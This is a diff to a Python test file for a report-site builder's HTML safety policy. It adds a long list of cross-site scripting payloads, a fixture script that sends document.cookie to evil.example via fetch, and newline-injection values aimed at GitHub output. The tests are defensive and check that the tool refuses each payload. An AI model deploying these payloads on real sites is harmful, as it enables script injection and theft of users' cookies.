@@ -1388,6 +1388,15 @@ def test_theme_switch_markup_matches_the_packaged_styles(tmp_path: Path):
     [
         ("https://github.com/x/y", "https://github.com/x/y"),
         (
+            "https://docs.livingprooflabs.com/reading-reports.html",
+            "https://docs.livingprooflabs.com/reading-reports.html",
+        ),
+        (
+            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
+            "https://github.com/Living-Proof-Labs/capability-verifier/commit/" + "c" * 40,
+        ),
+        ("https://[2001:db8::1]/x", "https://[2001:db8::1]/x"),
+        (
             "https://docs.livingprooflabs.com:8443/path",
             "https://docs.livingprooflabs.com:8443/path",
         ),
@@ -1573,6 +1582,8 @@ def test_safe_href_refuses_control_characters_that_urlsplit_keeps(value: str):
         ("INPUT_OUTPUT_DIR", "docs/\x1breports"),
         ("INPUT_ARTIFACT_NAME", "site\nreports-dir=/etc"),
         ("INPUT_ARTIFACT_NAME", "site\n"),
+        # The default artifact-name is built from GITHUB_RUN_ID, so it is checked too.
+        ("GITHUB_RUN_ID", "8\nreports-dir=/etc"),
     ],
 )
 def test_site_action_refuses_control_characters_before_writing_github_output(
@@ -1625,22 +1636,133 @@ def test_site_path_refuses_encoded_traversal_dot_segments_and_encoded_controls(
     assert (reports_common.site_path(value) == value) is allowed
 
 
-def test_forged_run_folder_with_recomputed_sha256sums_neutralizes_hostile_report_html(
-    tmp_path: Path,
-):
-    runs_in = tmp_path / "in"
-    hostile_html = (
-        "<!doctype html><html><body><main>"
-        "<script>alert(1)</script>"
-        "<img src='https://example.com/ok.png' onerror='alert(2)'>"
-        "<a href='javascript:alert(3)'>js</a>"
-        "<a href='javascript&#58;alert(4)'>ent</a>"
-        "<a href='http://insecure.example/x'>http</a>"
-        "<a href='https://github.com/Living-Proof-Labs/example'>safe</a>"
-        "</main></body></html>\n"
+# ---------------------------------------------------------------- va#20 N1: published report HTML
+
+
+REPORTER_FIXTURE = ROOT / "tests/fixtures/reporter/report-v3.15.4.html"
+
+HOSTILE_REPORT_MARKUP = [
+    "<SCRIPT>alert(1)</SCRIPT>",
+    "<script src='https://evil.example/x.js'></script>",
+    "<script data-report-times/>alert(1)</script>",
+    "<svg onload=alert(1)></svg>",
+    "<svg/onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<IMG SRC=x OnError=alert(1)>",
+    "<img srcset='https://evil.example/x.png 1x'>",
+    "<img src='evidence/x.png' onerror='alert(1)'>",
+    "<details open ontoggle=alert(1)><summary>x</summary></details>",
+    "<a href='https://ok.example/' onclick='alert(1)'>x</a>",
+    "<a href=javascript:alert(1)>x</a>",
+    "<a href='&#106;avascript:alert(1)'>x</a>",
+    "<a href='javascript&colon;alert(1)'>x</a>",
+    "<a href='javascript&#58;alert(1)'>x</a>",
+    "<a href='java&Tab;script:alert(1)'>x</a>",
+    "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
+    "<a href='http://insecure.example/'>x</a>",
+    "<a href='//evil.example/'>x</a>",
+    "<a href='https://user:pass@evil.example/'>x</a>",
+    "<a href='https://ok.example/' href='javascript:alert(1)'>x</a>",
+    "<a/href='javascript:alert(1)'>x</a>",
+    # Written so a browser and this parser could read the attributes differently.
+    "<a/href='https://ok.example/'>x</a>",
+    "<p title='x'class='y'>x</p>",
+    "<p title=a`b>x</p>",
+    "<p title=x=y>x</p>",
+    "<p class='a' class='b'>x</p>",
+    # Elements outside the reporter's vocabulary, even with no attributes.
+    "<iframe></iframe>",
+    "<object></object>",
+    "<xmp><img src=x onerror=alert(1)></xmp>",
+    "<plaintext>",
+    "<base>",
+    "<marquee>x",
+    "<noscript></noscript>",
+    "<math><mi>x</mi></math>",
+    "<svg><style>p{color:red}</style></svg>",
+    "<a href='https://ok.example/'/onclick=alert(1)>x</a>",
+    "<div style='background:url(https://evil.example/x)'>x</div>",
+    "<div style='background:u\\72l(https://evil.example/x)'>x</div>",
+    "<div style='background:image-set(\"https://evil.example/x\" 1x)'>x</div>",
+    "<style>@import 'https://evil.example/x.css';</style>",
+    "<style>body{background:url(https://evil.example/x)}</style>",
+    "<style>body{background:URL( 'https://evil.example/x' )}</style>",
+    "<style/>body{background:url(https://evil.example/x)}</style>",
+    "<svg><style><img src=x onerror=alert(1)></style></svg>",
+    "<svg><p>breakout</p></svg>",
+    "<p><div></div><svg></p><style><img src=x onerror=alert(1)></style></svg>",
+    "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>",
+    "<svg><use href='https://evil.example/x.svg#a'/></svg>",
+    "<svg><rect fill='url(https://evil.example/x#a)'/></svg>",
+    "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
+    "<svg><animate attributeName='href' to='javascript:alert(1)'/></svg>",
+    "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
+    "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
+    "<iframe src='https://evil.example/'></iframe>",
+    "<object data='https://evil.example/x.swf'></object>",
+    "<embed src='https://evil.example/x.swf'>",
+    "<base href='https://evil.example/'>",
+    "<meta http-equiv='refresh' content='0;url=https://evil.example/'>",
+    "<meta charset='utf-7'>",
+    "<link rel='stylesheet' href='https://evil.example/x.css'>",
+    "<form action='https://evil.example/'><input name='q'></form>",
+    "<button formaction='javascript:alert(1)'>x</button>",
+    "<input type='image' src='https://evil.example/x.png'>",
+    "<video src='evidence/x.mp4' poster='javascript:alert(1)'></video>",
+    "<video><source src='https://evil.example/x.mp4'></video>",
+    "<noscript><p title='</noscript><img src=x onerror=alert(1)>'></p></noscript>",
+    "<textarea><img src=x onerror=alert(1)></textarea>",
+    "<template><img src=x onerror=alert(1)></template>",
+    "<title><img src=x onerror=alert(1)></title>",
+    "<!--><img src=x onerror=alert(1)>-->",
+    "<!-- note -->",
+    "<![CDATA[<img src=x onerror=alert(1)>]]>",
+    "<?xml-stylesheet href='https://evil.example/x.xsl'?>",
+    "<!DOCTYPE html SYSTEM 'https://evil.example/x.dtd'>",
+    "<p>1 < 2</p>",
+    "<p>x</p><img src=x onerror=alert(1)",
+    "<p>a\x00b</p>",
+]
+
+
+@pytest.mark.parametrize("markup", HOSTILE_REPORT_MARKUP)
+def test_report_html_policy_refuses_hostile_markup(markup: str):
+    import reports_render
+
+    page = f"<!doctype html><html lang='en'><body><main>{markup}</main></body></html>\n"
+    # Each case gets past at least one rule; dropping that rule from the policy fails it.
+    with pytest.raises(site_tool.SiteError):
+        reports_render.checked_report_html(page, "probe")
+
+
+def test_real_reporter_report_passes_the_policy_byte_for_byte():
+    import reports_render
+
+    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
+    # A real v3.15.4 page: inline fonts, both reporter scripts, SVG, video and links.
+    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<svg", "<video"):
+        assert marker in text
+    assert reports_render.checked_report_html(text, "fixture") == text
+
+
+def test_unknown_reporter_script_is_removed_with_a_warning(capsys):
+    import reports_render
+
+    page = (
+        "<!doctype html><html lang='en'><body><p>kept</p>"
+        "<script data-report-times>fetch('https://evil.example/'+document.cookie)</script>"
+        "<p>also kept</p></body></html>\n"
     )
-    folder = _make_run_folder(runs_in, "hallway", run_id="909", html_override=hostile_html)
-    # Recompute SHA256SUMS as a forged run folder would.
+    cleaned = reports_render.checked_report_html(page, "probe")
+    assert cleaned == (
+        "<!doctype html><html lang='en'><body><p>kept</p><p>also kept</p></body></html>\n"
+    )
+    assert "not a known reporter script" in capsys.readouterr().err
+
+
+def _forged_run(runs_in: Path, html_text: str, **kwargs) -> Path:
+    folder = _make_run_folder(runs_in, "hallway", run_id="909", html_override=html_text, **kwargs)
+    # A forged run folder recomputes SHA256SUMS, so the checksums still match.
     (folder / "SHA256SUMS").write_text(
         "".join(
             f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
@@ -1648,18 +1770,73 @@ def test_forged_run_folder_with_recomputed_sha256sums_neutralizes_hostile_report
         ),
         encoding="utf-8",
     )
+    return folder
 
+
+def test_forged_run_folder_with_recomputed_sha256sums_and_hostile_report_is_refused(
+    tmp_path: Path,
+):
+    hostile = "<!doctype html><html><body><main><svg onload=alert(1)></svg></main></body></html>\n"
+    _forged_run(tmp_path / "in", hostile)
     reports_dir = tmp_path / "reports"
-    site_tool.build(reports_dir, runs_in)
+    with pytest.raises(site_tool.SiteError, match="onload"):
+        site_tool.build(reports_dir, tmp_path / "in")
+    assert not list(reports_dir.rglob("runs/909/index.html"))
 
-    run_dir = reports_dir / "unitree-g1/stock-mujoco-hallway/runs/909"
-    for name in ("index.html", "report.html"):
-        published = (run_dir / name).read_text(encoding="utf-8")
-        assert "<script" not in published.lower()
-        assert "onerror=" not in published.lower()
-        assert "javascript:" not in published.lower()
-        assert "javascript&#58;" not in published.lower()
-        assert "http://insecure.example" not in published.lower()
-        assert "https://github.com/Living-Proof-Labs/example" in published
 
-    subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=run_dir, check=True, capture_output=True)
+def test_report_html_file_is_checked_where_it_is_written(tmp_path: Path):
+    folder = tmp_path / "run"
+    folder.mkdir()
+    hostile = "<!doctype html><html><body><img src=x onerror=alert(1)></body></html>\n"
+    with pytest.raises(site_tool.SiteError, match="onerror"):
+        site_tool.publish_report_files(folder, hostile)
+    assert not (folder / "report.html").exists()
+
+
+def test_deleting_the_artifact_word_cannot_assemble_a_fetch(tmp_path: Path):
+    # The site deletes the word "artifact" after reading the page; the policy runs on the
+    # page it publishes, so "uartifactrl(" turning into "url(" is still refused.
+    hostile = (
+        "<!doctype html><html><head><style>body{background:uartifactrl(https://evil.example/x)}"
+        "</style></head><body><main><p>x</p></main></body></html>\n"
+    )
+    _forged_run(tmp_path / "in", hostile)
+    with pytest.raises(site_tool.SiteError, match="style"):
+        site_tool.build(tmp_path / "reports", tmp_path / "in")
+
+
+def test_real_reporter_report_is_published_unchanged(tmp_path: Path):
+    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
+    _make_run_folder(tmp_path / "in", "hallway", run_id="910", html_override=text)
+    site_tool.build(tmp_path / "reports", tmp_path / "in")
+    run_dir = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/910"
+    assert (run_dir / "report.html").read_text(encoding="utf-8") == text
+    page = (run_dir / "index.html").read_text(encoding="utf-8")
+    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<video"):
+        assert marker in page
+
+
+@pytest.mark.parametrize("stored", [False, True])
+def test_active_content_evidence_is_not_published(tmp_path: Path, stored: bool):
+    active = {
+        "plot.svg": b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
+        "page.htm": b"<script>alert(1)</script>",
+        "doc.xhtml": b"<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></html>",
+        "sub/page.html": b"<script>alert(1)</script>",
+    }
+    folder = _make_run_folder(
+        tmp_path / "in", "hallway", run_id="911", evidence_files={"seed-01.mp4": b"mp4", **active}
+    )
+    if stored:
+        # run.json can name evidence files directly, which skipped the old .html filter.
+        record = json.loads((folder / "run.json").read_text(encoding="utf-8"))
+        record["evidence"] = [
+            {"label": name, "kind": "note", "files": [{"path": f"evidence/{name}"}]}
+            for name in active
+        ]
+        (folder / "run.json").write_text(json.dumps(record), encoding="utf-8")
+    site_tool.build(tmp_path / "reports", tmp_path / "in")
+    evidence = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/911/evidence"
+    published = {p.relative_to(evidence).as_posix() for p in evidence.rglob("*") if p.is_file()}
+    assert "seed-01.mp4" in published
+    assert not published & set(active)
